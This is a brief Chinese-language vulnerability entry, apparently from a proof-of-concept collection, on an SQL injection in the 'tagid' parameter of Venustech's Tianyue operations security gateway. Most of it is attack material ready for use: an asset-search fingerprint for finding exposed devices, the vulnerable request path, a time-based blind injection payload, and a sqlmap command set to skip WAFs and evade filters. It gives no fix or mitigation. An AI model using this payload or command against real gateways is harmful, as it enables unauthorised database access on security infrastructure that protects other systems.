# 启明星辰天玥运维安全网关tagid参数存在SQL注入漏洞

- **系统**：启明星辰天玥运维安全网关tagid参数　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="启明星辰天玥运维安全网关"`
- **请求**：`POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Sec-Fetch-User: ?1`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 39`

**请求体 / payload**
```
checkname=123&tagid=123 AND 5327=(SELECT 5327 FROM PG_SLEEP(5))-- OkPa

sqlmap
sqlmap -u "https://xx.xx.xx.xx/ops/index.php?c=Reportguide&a=checkrn" --data "checkname=123&tagid=123" --skip-waf --random-agent --batch -p tagid  --tamper=space2comment
```

**其他**
- 启明星辰天玥运维安全网关tagid参数存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 天玥运维安全网关